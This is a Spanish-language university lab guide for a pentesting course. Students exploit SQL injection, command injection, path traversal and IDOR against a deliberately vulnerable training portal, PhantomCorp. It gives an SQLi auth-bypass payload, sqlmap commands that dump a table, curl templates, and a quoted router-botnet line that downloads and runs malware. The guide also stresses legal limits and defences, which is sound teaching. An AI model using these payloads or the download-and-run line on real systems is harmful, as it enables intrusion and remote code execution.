# Laboratorio 07 — Explotación

**Unidad 7** · Explotación: SQLi, inyección de comandos, path traversal e IDOR
**Modalidad:** grupos de 4 a 5 integrantes
**Entrega:** fork + Pull Request, en `entregas/lab07/grupoXX/`
**Entorno:** Docker (se levanta solo)

> **Cierra el ciclo recon → enum → explotación.** En el Lab 06 enumeraste la
> superficie de PhantomCorp. Ahora **convertís esos hallazgos en acceso**. Hacé
> los labs 05 y 06 primero: este asume que sabés mapear y enumerar.

---

## El escenario

El portal de PhantomCorp tiene un login, un buscador, una herramienta de red y
descargas. Todo "anda bien". Pero cada una de esas funciones **confía en lo que
le mandás** — y esa confianza es explotable. Tu trabajo: pasar de "puedo ver el
login" a "estoy adentro como admin"; de "hay un buscador" a "me traje la base de
datos"; de "hay una herramienta de ping" a "ejecuto comandos en el servidor".

Esto es el corazón del pentesting ofensivo. Y la regla que lo gobierna es una
sola:

> **Toda entrada del usuario es una mentira potencial.** Si el servidor mete tu
> input en una consulta SQL, en un comando del sistema o en una ruta de archivo
> **sin validarlo**, vos controlás esa consulta, ese comando o esa ruta.

---

## Por qué este laboratorio

Explotar no es "tener suerte". Es entender que el software mezcla, en el mismo
string, **datos** (lo que el usuario escribe) y **código** (la consulta, el
comando). Cuando esa frontera se rompe, tu dato se ejecuta como código. Todas las
familias que vas a ver son variantes de lo mismo:

| Vulnerabilidad | Qué se confunde | Resultado |
|---|---|---|
| SQL injection | tu texto ↔ la consulta SQL | leés/modificás la base de datos |
| Command injection | tu texto ↔ un comando de shell | ejecutás comandos (RCE) |
| Path traversal | tu texto ↔ una ruta de archivo | leés archivos arbitrarios |
| IDOR | tu id ↔ el objeto que te devuelven | accedés a datos ajenos |

En OWASP Top 10, esto es **A03: Injection** y **A01: Broken Access Control** —
las dos categorías más explotadas del mundo real.

Y va **a mano primero**. sqlmap es maravilloso, pero si no sabés qué inyecta y
por qué, cuando falle no vas a saber por qué. Primero entendés la query. Después
la automatizás.

---

## Objetivos de aprendizaje

1. Explicar cómo una inyección rompe la frontera datos/código.
2. Ejecutar **SQL injection** manual: bypass de autenticación y extracción de
   datos con `UNION`, razonando sobre la consulta subyacente.
3. Ejecutar **inyección de comandos** y explicar qué la habilita.
4. Explotar **path traversal** para leer archivos fuera del directorio previsto.
5. Detectar y explotar un **IDOR** y explicar por qué el control de acceso no se
   hace del lado del cliente.
6. Distinguir la explotación **manual** de la **automatizada** (sqlmap) y saber
   cuándo usar cada una.

---

## Requisitos y preparación

```bash
make setup            # suma sqlmap a la consola
./ctf lab 07          # levanta el portal PhantomCorp y abre esta guía
make shell            # a la consola del atacante
```

> **Regla de oro.** Solo `phantomcorp`. Estas técnicas contra un sistema ajeno
> son delito (Ley 26.388). Sin excepción.

---

## Parte 1 · TEORÍA — la frontera datos/código

Mirá esta consulta, típica de un login mal hecho:

```
SELECT user, rol FROM users WHERE user='<lo_que_escribís>' AND pass='<...>'
```

El servidor **arma ese string pegando** tu input. Si escribís de usuario:

```
admin' --
```

la consulta queda:

```
SELECT user, rol FROM users WHERE user='admin' --' AND pass='...'
```

El `--` es un comentario en SQL: **desactiva el resto**. La verificación de
contraseña desapareció. Entraste como admin sin saber su clave. **Tu dato se
volvió código.**

Lo mismo pasa cuando el input va a un comando (`ping <host>`) o a una ruta
(`open("public/" + archivo)`). Siempre es la misma falla: **concatenar sin
separar datos de instrucciones.** La defensa (que vas a analizar en el
entregable) es siempre la misma familia: consultas parametrizadas, listas
blancas, y **nunca** confiar en el input.

---

## Parte 2 · EJEMPLOS

**Ejemplo A — SQLi que se robó una elección de datos.** La brecha de **TalkTalk
(2015)** fue una SQL injection en una página web que expuso datos de ~157.000
clientes. Una consulta concatenada. Multa récord.

**Ejemplo B — Command injection en routers.** Miles de routers domésticos fueron
reclutados en botnets por un campo "hostname" que iba directo a un comando de
shell. `; wget malware; ./malware`. El mismo patrón que vas a explotar acá.

**Ejemplo C — IDOR de manual.** Una app bancaria mostraba tu recibo en
`/recibo?id=1042`. Cambiando el número (`1043`, `1044`...) se veían los recibos
de otros clientes. No hacía falta "hackear" nada: faltaba la pregunta "¿este
recibo es tuyo?".

---

## Parte 3 · TOOLS Y TÉCNICAS

### 3.1 `curl` — tu herramienta principal de explotación

Todo esto se explota con requests HTTP. `curl` te deja armar cada uno a mano:

```bash
# POST con datos de formulario (login):
curl -s -X POST http://phantomcorp/login \
     --data-urlencode "user=admin" --data-urlencode "pass=1234"

# GET con parámetro que necesita URL-encoding (payloads con espacios y comillas):
curl -s -G http://phantomcorp/buscar --data-urlencode "q=Router"
```

`--data-urlencode` es clave: codifica por vos las comillas, espacios y símbolos
de tus payloads. Sin eso, el payload se rompe en el camino.

### 3.2 SQL injection a mano

**Bypass de autenticación** (R1): el objetivo es que la consulta devuelva la fila
del admin sin su contraseña. Pensá qué payload en `user` comenta el chequeo de
`pass`. (Pista teórica: Parte 1.)

**Extracción con UNION** (R2): si un endpoint te muestra resultados de una
consulta `SELECT nombre, precio FROM ...`, podés **anexar** con `UNION SELECT` una
consulta tuya que traiga otra tabla. Requisitos del UNION:
- Mismo **número de columnas** que la consulta original (acá, dos).
- El comentario `--` al final para anular lo que sobra.

El servidor es **verboso con los errores SQL** a propósito: úsalos para afinar el
payload. Un error es información.

### 3.3 `sqlmap` — la automatización (después de entender)

Cuando ya entendés la inyección a mano, sqlmap la explota (y mucho más) sola:

```bash
sqlmap -u "http://phantomcorp/buscar?q=Router" --batch --dbs
sqlmap -u "http://phantomcorp/buscar?q=Router" --batch --dump -T secrets
```

**Pero ojo:** en el entregable tenés que mostrar que sabés hacerlo **a mano**.
sqlmap sin entendimiento es apretar botones. El día que la app tenga una defensa
rara, el que entiende pasa; el que solo sabe sqlmap, no.

### 3.4 Inyección de comandos y path traversal

```bash
# ¿el input va a un comando? probá encadenar con ; | && :
curl -s -G http://phantomcorp/herramientas/ping --data-urlencode "host=127.0.0.1"

# ¿el input va a una ruta de archivo? probá salir del directorio con ../ :
curl -s -G http://phantomcorp/descargar --data-urlencode "archivo=catalogo.txt"
```

---

## Parte 4 · PRÁCTICA — explotá PhantomCorp

Consola (`make shell`). La pista te da la técnica y el endpoint. El payload lo
armás vos: ese es el ejercicio.

| Reto | Técnica | Endpoint | Pista |
|---|---|---|---|
| **R1** | SQLi bypass de auth | `POST /login` | Entrá como **admin** sin su contraseña. ¿Qué payload en `user` comenta el chequeo de `pass`? |
| **R2** | SQLi UNION | `GET /buscar?q=` | El buscador devuelve dos columnas. Anexá con `UNION` una consulta a la tabla `secrets`. |
| **R3** | Command injection | `GET /herramientas/ping?host=` | El `host` va directo a un comando. Encadená otro comando y leé un archivo del server (`/app/flags/`). |
| **R4** | Path traversal | `GET /descargar?archivo=` | El archivo se abre desde `public/`. Salí de ahí con `../` hasta `flags/lfi.txt`. |
| **R5** | IDOR | `GET /perfil?id=` | Tu perfil es el `id=3`. ¿Qué pasa si pedís el `id` del admin? |

```bash
./ctf submit 07 R1 'FLAG{...}'
./ctf status 07
```

---

## Parte 5 · ANÁLISIS Y DEFENSA — el entregable (la nota)

En `entregable.md`, por cada vulnerabilidad explotada:

| Vuln | Payload usado | Consulta/comando/ruta resultante | Impacto | Defensa concreta |
|---|---|---|---|---|
| SQLi auth | `admin' --` | *(la query final)* | *(qué logró)* | *(cómo se previene)* |
| ... | | | | |

### Preguntas de análisis

1. **P1.** Explicá, con la consulta concreta del R1, **por qué** funciona el
   bypass. ¿Qué hace exactamente el `--`?
2. **P2.** En el R2, ¿por qué el `UNION` necesita el mismo número de columnas?
   ¿Cómo lo averiguarías si no supieras que son dos?
3. **P3.** El R3 te dio ejecución de comandos. ¿Qué es lo **siguiente** que haría
   un atacante real con eso? (pensá en persistencia — Lab 08).
4. **P4.** La defensa de SQLi son las **consultas parametrizadas**. Explicá con
   tus palabras por qué parametrizar mata la inyección de raíz.
5. **P5.** El IDOR (R5): ¿por qué el control de acceso **no** puede depender de
   que el cliente "no cambie el id"? ¿Dónde tiene que ir la verificación?

---

## Qué se entrega

En `entregas/lab07/grupoXX/`: `informe.md` (tabla de explotación + P1–P5 +
captura de `./ctf status 07`) y `research.md`. Fecha límite: antes del Lab 08.
Rúbrica en [`docs/rubrica.md`](docs/rubrica.md).

## Uso responsable

Explotación = intrusión. Solo el lab de la cátedra. Ley 26.388. Si encontrás una
vuln real en otro lado por accidente: no la toques, informá y pará.

---

## Retos bonus (opcional)

¿Estas flags te quedaron cortas? En el
[banco de retos bonus](../../docs/BANCO-DE-RETOS.md) hay **3 desafíos más para
este lab**, con más herramientas y dificultad progresiva (★ / ★★ / ★★★). No
cuentan para la aprobación, pero es donde te hacés bueno de verdad.
